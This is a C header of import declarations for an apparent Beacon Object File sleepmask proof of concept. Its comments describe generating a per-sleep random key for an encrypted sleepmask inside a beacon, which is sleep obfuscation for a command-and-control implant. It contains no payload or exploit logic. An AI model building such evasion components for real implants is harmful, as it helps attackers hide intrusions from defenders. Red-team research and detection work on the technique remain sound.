/* sleepmask/include/Imports.h
 * BOF import declarations for the WFSO PoC sleepmask. */

#pragma once
#include <windows.h>

/* ========= [ MSVCRT ] ========= */

__declspec(dllimport) int    __cdecl MSVCRT$printf( const char*, ... );

#define printf  MSVCRT$printf

/* ========= [ kernel32 ] ========= */

__declspec(dllimport) BOOL    WINAPI KERNEL32$VirtualProtect( LPVOID, SIZE_T, DWORD, PDWORD );
__declspec(dllimport) DWORD   WINAPI KERNEL32$WaitForMultipleObjects( DWORD, const HANDLE*, BOOL, DWORD );

#define VirtualProtect         KERNEL32$VirtualProtect
#define WaitForMultipleObjects KERNEL32$WaitForMultipleObjects

/* ========= [ ntdll ] ========= */

__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtWaitForSingleObject( HANDLE, BOOLEAN, PLARGE_INTEGER );
__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtCreateEvent( PHANDLE, ACCESS_MASK, PVOID, DWORD, BOOLEAN );
__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtClose( HANDLE );

#define NtWaitForSingleObject   NTDLL$NtWaitForSingleObject
#define NtCreateEvent           NTDLL$NtCreateEvent
#define NtClose                 NTDLL$NtClose

/* ========= [ bcrypt - per-sleep random key (P2 encrypted sleepmask) ] =========
 * bcrypt.dll is already loaded by the beacon, so the BOF loader's
 * LoadLibraryA("bcrypt.dll") resolves this. hAlgorithm=NULL + dwFlags=
 * BCRYPT_USE_SYSTEM_PREFERRED_RNG uses the system CSPRNG with no algo handle. */

__declspec(dllimport) NTSTATUS NTAPI BCRYPT$BCryptGenRandom( PVOID, PUCHAR, ULONG, ULONG );

#define BCryptGenRandom                     BCRYPT$BCryptGenRandom
#define BCRYPT_USE_SYSTEM_PREFERRED_RNG      0x00000002
#define NAX_SM_KEY_LEN                       16

/* ========= [ common macros ] ========= */

#ifndef NtCurrentProcess
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#endif

#ifndef EVENT_ALL_ACCESS
#define EVENT_ALL_ACCESS 0x1F0003
#endif
